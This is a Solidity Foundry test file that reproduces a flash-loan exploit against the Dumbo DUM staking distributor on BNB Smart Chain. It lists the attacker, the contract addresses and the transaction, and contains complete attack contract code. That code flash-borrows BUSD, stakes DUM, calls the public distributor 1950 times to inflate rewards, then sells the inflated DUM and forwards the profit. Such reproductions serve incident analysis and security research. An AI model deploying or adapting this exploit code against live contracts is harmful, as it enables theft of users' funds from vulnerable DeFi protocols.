// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 628.45 BUSD
// Attacker : 0x280489Ba18fC7FbfAa38316EfF5b842dCc91a738
// Attack Contract : 0x8D8E60D23bac161ebaB168D50b239C63CdCc8342
// Vulnerable Contract : 0x495670E5a43CE393597952b2fE944036E6785Baf
// Attack Tx : https://bscscan.com/tx/0xbfd59a18d4500649c6a15e578fdd0a05fdef5b932f3e3d51b8e2a5640cd4fb6c
//
// @Info
// Vulnerable Contract Code : unverified
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1181
//
// Attack summary: The attacker flash-borrowed BUSD, bought and staked DUM, repeatedly called the
// public distributor to mint rewards into the staking path, then unstaked and sold the inflated DUM.
// Root cause: Dumbo's distributor can be triggered repeatedly by an external caller, allowing reward
// minting to be compounded inside one transaction.

address constant ATTACKER = 0x280489BA18fC7FbfAa38316eFF5b842dcc91a738;
address constant TRACE_ATTACK_CONTRACT = 0x8d8e60d23Bac161EBAB168D50B239c63CDcc8342;
address constant TRACE_HELPER = 0x1d225e796ba141848575871A6D9dF69f4Fb3b8Ea;
address constant DUM_TOKEN = 0xD1AF3A592f8B412608a2768DA3D7Aa01d0c2A4CB;
address constant SDUM_TOKEN = 0x3AAD3e7734CA8b8C61F5590AfA018c0eE104dCB4;
address constant STAKING = 0xc73DD6De7581ED388E9Eb85A8E66a7bC3fb025E3;
address constant DUM_DISTRIBUTOR = 0x495670E5A43ce393597952b2fE944036E6785BaF;
address constant DUM_BUSD_PAIR = 0xFa8b88aACCDCa60e396B6899e9a472799D7E9615;
address constant FLASH_PAIR = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;
address constant BUSD_TOKEN = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant PANCAKE_ROUTER = 0x54509f72B9AaA941BECaA098625Bff930bCfB1A2;
uint256 constant FLASH_BUSD_AMOUNT = 6900 ether;
uint256 constant FLASH_BUSD_REPAY = 6915 ether;
uint256 constant DISTRIBUTE_CALLS = 1950;

interface IStakingLike {
    function stake(
        uint256 amount,
        address recipient
    ) external returns (bool);
    function rebase() external;
    function distributor() external returns (address);
}

interface IDistributorLike {
    function distribute() external returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        uint256 forkBlock = 50_277_887;
        vm.createSelectFork("bsc", forkBlock);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = BUSD_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(TRACE_HELPER, "Trace Helper");
        vm.label(DUM_TOKEN, "DUM");
        vm.label(SDUM_TOKEN, "sDUM");
        vm.label(STAKING, "Dumbo Staking");
        vm.label(DUM_DISTRIBUTOR, "Dumbo Distributor");
        vm.label(DUM_BUSD_PAIR, "DUM/BUSD Pair");
        vm.label(FLASH_PAIR, "Ape WBNB/BUSD Pair");
        vm.label(BUSD_TOKEN, "BUSD");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(PANCAKE_ROUTER, "Dum Router");
    }

    function testExploit() public balanceLog {
        assertEq(IUniswapV2Pair(FLASH_PAIR).token0(), WBNB_TOKEN);
        assertEq(IUniswapV2Pair(FLASH_PAIR).token1(), BUSD_TOKEN);
        assertEq(IUniswapV2Pair(DUM_BUSD_PAIR).token0(), DUM_TOKEN);
        assertEq(IUniswapV2Pair(DUM_BUSD_PAIR).token1(), BUSD_TOKEN);

        uint256 busdBefore = IERC20(BUSD_TOKEN).balanceOf(profitReceiver);

        // step 1: request the BUSD flash swap through a local attack helper.
        DumboDistributionAttack attack = new DumboDistributionAttack(profitReceiver);
        attack.execute();

        uint256 profit = IERC20(BUSD_TOKEN).balanceOf(profitReceiver) - busdBefore;
        assertGt(profit, 600 ether);
        assertLt(profit, 650 ether);
    }
}

contract DumboDistributionAttack {
    address private immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function execute() external {
        IUniswapV2Pair(FLASH_PAIR).swap(0, FLASH_BUSD_AMOUNT, address(this), "Gogogo");
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == FLASH_PAIR, "not flash pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == 0 && amount1 == FLASH_BUSD_AMOUNT, "unexpected loan");

        // step 2: inflate redeemable DUM through repeated public distribution calls.
        _runDumboInflation();

        // step 3: repay the flash pair and forward the traced attacker payout.
        require(IERC20(BUSD_TOKEN).transfer(FLASH_PAIR, FLASH_BUSD_REPAY), "flash repay failed");
        uint256 remainingBusd = IERC20(BUSD_TOKEN).balanceOf(address(this));
        require(IERC20(BUSD_TOKEN).transfer(profitReceiver, remainingBusd / 2), "profit transfer failed");
    }

    function _runDumboInflation() private {
        // step 2a: buy and stake DUM as the reward base.
        _approve(BUSD_TOKEN, PANCAKE_ROUTER);
        _swapBusdForDum();

        _approve(DUM_TOKEN, STAKING);
        _approve(SDUM_TOKEN, STAKING);

        // step 2b: run the trace's two distribution/rebase/unstake cycles.
        _stakeDum();
        _touchStakingAccount();
        _distributeRewards();
        _rebaseThreeTimes();
        _unstakeAllSDum();

        _stakeDum();
        _touchStakingAccount();
        _distributeRewards();
        _rebaseThreeTimes();
        _unstakeAllSDum();

        // step 2c: sell the inflated DUM in balance-derived chunks.
        _approve(DUM_TOKEN, PANCAKE_ROUTER);
        for (uint256 remainingSwaps = 3; remainingSwaps > 0; --remainingSwaps) {
            _swapDumForBusd(IERC20(DUM_TOKEN).balanceOf(address(this)) / remainingSwaps);
        }
    }

    function _swapBusdForDum() private {
        address[] memory path = new address[](2);
        path[0] = BUSD_TOKEN;
        path[1] = DUM_TOKEN;

        Uni_Router_V2(PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(BUSD_TOKEN).balanceOf(address(this)), 0, path, address(this), block.timestamp
            );
    }

    function _stakeDum() private {
        require(IStakingLike(STAKING).stake(IERC20(DUM_TOKEN).balanceOf(address(this)), address(this)), "stake failed");
    }

    function _touchStakingAccount() private {
        (bool ok,) = STAKING.call(abi.encodeWithSelector(bytes4(0x1e83409a), address(this)));
        require(ok, "staking account touch failed");
    }

    function _distributeRewards() private {
        address distributor = IStakingLike(STAKING).distributor();
        require(distributor == DUM_DISTRIBUTOR, "unexpected distributor");
        for (uint256 i = 0; i < DISTRIBUTE_CALLS; ++i) {
            require(IDistributorLike(distributor).distribute(), "distribute failed");
        }
    }

    function _rebaseThreeTimes() private {
        for (uint256 i = 0; i < 3; ++i) {
            IStakingLike(STAKING).rebase();
        }
    }

    function _unstakeAllSDum() private {
        (bool ok,) =
            STAKING.call(abi.encodeWithSelector(bytes4(0x9ebea88c), IERC20(SDUM_TOKEN).balanceOf(address(this)), true));
        require(ok, "unstake failed");
    }

    function _swapDumForBusd(
        uint256 amount
    ) private {
        address[] memory path = new address[](2);
        path[0] = DUM_TOKEN;
        path[1] = BUSD_TOKEN;

        Uni_Router_V2(PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function _approve(
        address token,
        address spender
    ) private {
        require(IERC20(token).approve(spender, type(uint256).max), "approve failed");
    }
}
